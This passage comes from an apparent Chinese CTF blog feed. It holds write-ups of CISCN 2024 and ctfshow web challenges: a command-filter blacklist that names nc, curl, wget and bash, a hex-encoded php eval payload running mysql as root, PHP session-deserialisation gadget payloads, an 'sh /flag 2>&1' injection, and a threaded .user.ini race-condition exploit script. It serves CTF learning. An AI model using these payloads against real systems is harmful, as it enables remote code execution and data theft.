class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>,<span class="variable">$cmd</span>)) </span><br><span class="line"></span><br><span class="line">&#123;     </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>)</span><br><span class="line"></span><br><span class="line">;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很多函数我都没见过，还过滤这么多东西</p>
<p>坐牢一下午</p>
<p>函数就不进行解释了</p>
<p>发现可以通过换行符进行了绕过</p>
<p>看了一些wp，这些人是这么想到的？他们竟然能用rce来做这题</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</span><br></pre></td></tr></table></figure>

<p>php -r这真让人难以想到</p>
<p>找到flag就可以了</p>
<p>文章：<a href="https://xia0ji233.pro/2024/05/19/CISCN2024/index.html">https://xia0ji233.pro/2024/05/19/CISCN2024/index.html</a></p>
<p>还有一种就是反弹shell了</p>
<p>以为可以%0a换行符号绕过</p>
<p>在复现之前我得先搭建个服务器给自己</p>
<p>所以这几天我看能不能搭建自己的服务器</p>
<h1 id="PHP的session反序列化漏洞"><a href="#PHP的session反序列化漏洞" class="headerlink" title="PHP的session反序列化漏洞"></a><strong>PHP的session反序列化漏洞</strong></h1><p>反序列化还是有一点点的基础，现在的想法就是边做题边看wp边学习做笔记，先学广在慢慢学精</p>
<p>SESSION先了解下</p>
<p><strong>PHP Session 概述</strong></p>
<p>session 是一种客户与网站（服务器）更为安全的对话方式。一旦开启了 session 会话，便可以在网站的任何页面使用（保持）这个会话，从而让访问者与网站之间建立了一种“对话”机制。</p>
<p>这是官方的解释</p>
<p>session 会话会为每一个开启了 session 会话的访问者建立一个唯一的会话 ID ，用于识别用户。该会话 ID 可能存储于用户电脑的 cookie 内，也可能通过 URL 来传递。而对应的具体 session 值会存储于服务器端，这也是与 cookie 的主要区别，并且安全性相对较高。</p>
<p>回到session的反序列化</p>
<p>在php.ini中存在三项配置项：</p>
<ul>
<li><code>session.save_path=&quot;&quot;</code>  –设置session的存储路径</li>
<li><code>session.save_handler=&quot;&quot;</code>–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</li>
<li><code>session.auto_start  boolen</code> –指定会话模块是否在请求开始时启动一个会话,默认为0不启动</li>
<li><code>session.serialize_handler  string</code>–定义用来序列化&#x2F;反序列化的处理器名字。默认使用php</li>
</ul>
<p>以上的选项就是与PHP中的Session存储和序列话存储有关的选项。</p>
<p>举例：</p>
<ul>
<li><code>session.save_path=&quot;D:\xampp\tmp&quot;</code> 表明所有的session文件都是存储在xampp&#x2F;tmp下</li>
<li><code>session.save_handler=files</code>   表明session是以文件的方式来进行存储的</li>
<li><code>session.auto_start=0</code>  表明默认不启动session</li>
<li><code>session.serialize_handler=php</code>   表明session的默认序列话引擎使用的是php序列话引擎</li>
</ul>
<ol>
<li><strong>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</strong></li>
<li><strong>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</strong></li>
<li><strong>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</strong></li>
</ol>
<p><strong>存储机制</strong></p>
<p>php中的session中的内<strong>容并不是放在内存</strong>中**的，而是以*文件******的方式来存储的，存储方式就是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式存储。</p>
<p>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。</p>
<p>假设我们的环境是xampp，那么默认配置如上所述。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">在php_serialzie引擎下</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>()</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>SESSION文件的内容是<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125;</code> 。a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
<p><strong>在php_binary引擎下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>SESSION文件的内容是<code>names:6:&quot;spoock&quot;;</code> 。由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p>
<p><strong>序列化简单利用</strong></p>
<?php

class syclover{

 var $func=""; function __construct() {  $this->func = "phpinfo()";

 }

 function __wakeup(){

  eval($this->func);

 }

}

unserialize($_GET['a']);

?>

<p>在11行对传入的参数进行了序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行<code>eval()</code>方法。我们访问<code>localhost/test.php?a=O:8:&quot;syclover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code>。</p>
<p>得到的反序列化内容是</p>
<p>object(syclover)[1]</p>
<p> public ‘func’ &#x3D;&gt; string ‘echo “spoock”;’ (length&#x3D;14)</p>
<p><strong>PHP Session中的序列化危害</strong></p>
<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。</p>
<p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
<p>$_SESSION<code>[</code>‘ryat’<code>] = </code>‘|O:11:”PeopleClass”:0:{}’&#96;&#96;;</p>
<p>上述的$_SESSION的数据使用php_serialize，那么最后的存储的内容就是<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</code>。</p>
<p>但是我们在进行读取的时候，选择的是php，那么最后读取的内容是:</p>
<p>array<code> </code>(size&#x3D;1)<code> </code>‘a:1:{s:6:”spoock”;s:24:”‘<code> </code>&#x3D;&gt; <code> </code>object(__PHP_Incomplete_Class)[1]<code> </code>public<code> </code>‘__PHP_Incomplete_Class_Name’<code> </code>&#x3D;&gt; string &#96;&#96;’PeopleClass’<code> </code>(length&#x3D;11)</p>
<p>这是因为当使用php引擎的时候，<strong>php引擎会以|作为作为key和value的分隔符</strong>，那么就会将<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。 这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
<p><strong>实际利用</strong></p>
<p>存在s1.php和us2.php，2个文件所使用的SESSION的引擎（session.serialize_handler）不一样，就形成了一个漏洞、</p>
<p>s1.php，使用php_serialize来处理session</p>
<?php ini_set`(`'session.serialize_handler','php_serialize'`);`session_start();

$$_SESSION``[``"spoock"``]=`$$_GET`[`"a"``];

**us2.php,使用php来处理session**

ini_set`(`'session.serialize_handler'`,'php'`);

session_start();

class` `lemon {

​    var` `$hi``;`     function` `__construct(){      $this`->hi = `'phpinfo();';`           }``          function` `__destruct() {         `eval`(`$this`->hi);         ` ``}`       `}

**当访问s1.php时，提交如下的数据：**

localhost/s1.php?a=|O:5:`"lemon"`:1:{s:2:`"hi"`;s:14:`"echo "`spoock`";"`;}

此时传入的数据会按照php_serialize来进行序列化。

此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的`eval()`方法。

例题

# **CTFSHOW 新生杯**

### **剪刀石头布**

考查[session](https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020)反序列化漏洞。 不同的session处理器会导致[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)漏洞

exp：

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://697e59f6-2b82-43b9-806d-25fa3965a86b.challenge.ctf.show/&quot;</span><br><span class="line">sess=&quot;yu22x&quot;</span><br><span class="line">data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;|O:4:&quot;Game&quot;:1:&#123;s:3:&quot;log&quot;;s:22:&quot;/var/www/html/flag.php&quot;;&#125;&#x27;&#125;</span><br><span class="line">files=&#123;&#x27;file&#x27;:&#x27;1&#x27;&#125;</span><br><span class="line">r = requests.post(url,data=data,files=files,cookies=&#123;&#x27;PHPSESSID&#x27;:&#x27;yu22x&#x27;&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

# **安恒杯一道题**

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;varr))&#123;   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;文件&quot;</span>.<span class="variable language_">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

index.php

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">分析可以知道最后肯定是要用execue里的<span class="keyword">eval</span>的</span><br><span class="line"></span><br><span class="line">在本地搭建环境，构造我们需要执行的自定义函数</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>=<span class="string">&#x27;echo &quot;spoock&quot;;&#x27;</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">foo3</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="keyword">new</span> <span class="title function_ invoke__">foo2</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

在foo1中的构造函数中定义$varr的值为foo2的实例，在foo2中定义$obj为foo3的实例，在foo3中定义$varr的值为echo "spoock"。最终得到的序列话的值是

$$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo "spoock";";}}}$$

]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow原谅杯</title>
    <url>/2024/07/19/ctfshow%E5%8E%9F%E8%B0%85%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>])?<span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xbx&#x27;</span>]):<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>发现xbx可以rce</p>
<p>ls 发现</p>
<p>index.php yuanliang_4_xxx.zip</p>
<p>并且flag在&#x2F;目录里面</p>
<p>直接cat发现不行</p>
<p>我们ls &#x2F;bin目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin 目录是 Unix/Linux 系统中的一个重要目录,它存放着许多常用的可执行文件(二进制文件)。这些文件通常是系统管理员或普通用户经常使用的基本命令和应用程序</span><br></pre></td></tr></table></figure>

<p>最终发现sh rm ls 这三个命令可以执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh是一个轻量级的shell,相比于bash等更高级的shell,它提供了更基础的功能。但它仍然是许多系统管理任务的首选shell。</span><br></pre></td></tr></table></figure>

<p>明显让我们用sh来做题目</p>
<p>sh也可以像cat一样读取文件内容但是有一点不同</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# cat Gu0f3n.txt</span><br><span class="line">Gu0f3n</span><br><span class="line">[root@iZbp1g5j7wkdznqpfv918wZ ctf]# sh Gu0f3n.txt</span><br><span class="line">Gu0f3n.txt: line 1: Gu0f3n: command not found</span><br></pre></td></tr></table></figure>

<p>他会报错 command not found</p>
<p>因为当命令不被正常执行则会报错</p>
<p>这里我们可以用linux重定向错误输出</p>
<p>我们都知道在文件描述符中0，1，2 分表示标准输入，标准输出，标准错误输出</p>
<p>其次我们需要了解规律</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.标准输入0、输出1、错误2需要分别重定向，一个重定向只能改变它们中的一个</span><br><span class="line">2. 标准输入0和标准输出1可以省略。（当其出现重定向符号左侧时）  </span><br><span class="line">3. 文件描述符在重定向符号左侧时直接写即可，在右侧时前面加&amp; </span><br><span class="line">4.  文件描述符与重定向符号之间不能有空格</span><br></pre></td></tr></table></figure>

<p>参考文章：<a href="https://blog.csdn.net/weixin_29491885/article/details/111050189">https://blog.csdn.net/weixin_29491885/article/details/111050189</a></p>
<p>那么这道题目我们</p>
<p>用sh读取&#x2F;flag的内容将他的报错输出</p>
<p>sh &#x2F;flag 2&gt;%261</p>
<p>需要姜&amp;url编码为%26</p>
<p>paylod:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xbx=sh%20/flag%202&gt;%261</span><br></pre></td></tr></table></figure>



<h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><p>打开题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;“你好”：“fastapi2”&#125;</span><br></pre></td></tr></table></figure>

<p>fast api2</p>
<p>首先就是了解fastapi2这个东西</p>
<p>FastAPI 是一个现代、快速（高性能）的 Web 框架，用于构建基于 Python 的 **<a href="https://apifox.com/apiskills/understanding-apis/">API</a>**。它是一个开源项目，基于 Starlette 和 Pydantic 库构建而成，提供了强大的功能和高效的性能。</p>
<p>在 FastAPI 中，<code>/docs</code> 路由提供了一个自动生成的交互式 API 文档界面。这是 FastAPI 的一个非常有用的特性，用于查看和测试 API 的各个端点</p>
<p>在更具题目给的提示</p>
<p>进入路由</p>
<p>发现三个函数</p>
<p>其中第二个calc</p>
<p>根据提示给的黑名单</p>
<p>我们展示全局变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/3.png"></p>
<p>发现可疑的变量youdontknow</p>
<p>展示这个变量发现一堆过滤得到关键词</p>
<p>我们用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">youdontknow.clear()</span><br></pre></td></tr></table></figure>

<p>clear掉过滤的关键词语</p>
<p>最后直接读flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/4.png"></p>
<h3 id="fastapi2-for-阿狸"><a href="#fastapi2-for-阿狸" class="headerlink" title="fastapi2 for 阿狸"></a>fastapi2 for 阿狸</h3><p><strong>和5一样</strong></p>
<p>clear掉</p>
<p>嗨嗨</p>
<h2 id="原谅6-web3"><a href="#原谅6-web3" class="headerlink" title="原谅6_web3"></a>原谅6_web3</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>] ?? <span class="literal">NULL</span>;</span><br><span class="line">(<span class="title function_ invoke__">waf_file</span>(<span class="variable">$file</span>)&amp;&amp;<span class="title function_ invoke__">waf_content</span>(<span class="variable">$content</span>))?(<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>)):<span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>简单来说就是你输进去的文件不在waf的绕过里面就可以了</p>
<p>绕过的东西很多但是没有绕过**.user.ini**</p>
<p>.user.ini 文件是<strong>PHP 中用于配置特定目录的设置的特殊文件</strong>。 它类似于Apache 服务器中的 . htaccess 文件，但仅适用于PHP。 .user.ini 文件允许用户为特定目录定义PHP 配置指令，这些配置指令将在该目录及其所有子目录中的PHP 脚本执行时生效。</p>
<p><code>.user.ini</code> 文件的主要目的是为了允许非管理员用户自定义某些 PHP 配置选项，而不需要访问主 <code>php.ini</code> 文件。这样，不同的应用程序或用户可以在自己的目录中设置特定的 PHP 配置，而不影响整个服务器的配置。</p>
<p>这里的考点就是session和.user.ini的条件竞争</p>
<p>参考文章：<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p><strong>auto_prepend_file 表示在php程序加载应用程序前加载指定的php文件</strong></p>
<p>GET：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=.user.ini</span><br></pre></td></tr></table></figure>

<p>POST:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/tmp/sess_Gu0f3n</span><br></pre></td></tr></table></figure>

<p>然后用下大佬的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Author：Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Gu0f3n&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://c41b9ab0-e1f5-4e05-b75c-a7ea64fa3d91.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php system(&#x27;cat ./flag.php&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Gu0f3n.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.get(url+<span class="string">&quot;waf.php&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="comment"># 第一步上传.user.ini文件，将我们的session文件内容添加到默认头</span></span><br><span class="line">        y4tacker = &#123;</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: <span class="string">&quot;auto_prepend_file=/tmp/sess_&quot;</span> + sessid</span><br><span class="line">        &#125;</span><br><span class="line">        session.post(url + <span class="string">&quot;?file=.user.ini&quot;</span>, data=y4tacker)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>

<p>结果</p>
